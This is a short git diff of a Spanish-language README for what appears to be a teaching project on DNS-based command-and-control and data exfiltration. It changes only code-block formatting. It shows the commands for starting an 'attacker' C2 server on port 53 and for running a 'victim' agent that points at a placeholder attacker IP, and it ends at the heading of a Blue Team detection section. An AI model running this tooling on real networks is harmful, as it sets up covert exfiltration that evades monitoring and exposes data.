@@ -40,13 +40,15 @@ El proyecto consta de un servidor atacante que intercepta peticiones DNS especí
   1. Iniciar el Servidor C2 (Atacante)
 El servidor soporta argumentos para configurar la IP de escucha, el puerto y el dominio objetivo. Para un entorno realista, se recomienda usar el puerto 53.
 
-Bash
+```bash
 python dns_server_receiver.py -i 0.0.0.0 -p 53 -d beacon.falso.local
+```
 2. Ejecutar el Agente (Víctima)
 El cliente requiere que se le especifique la IP del servidor C2 (parámetro -t).
 
-Bash
+```bash
 python dns_victim_client.py -t <IP_DEL_ATACANTE> -p 53
+```
 🛡️ Blue Team: Detección y Mitigación
 Para detectar y bloquear este tipo de exfiltración/C2 en una red corporativa, se recomienda aplicar las siguientes contramedidas:
 
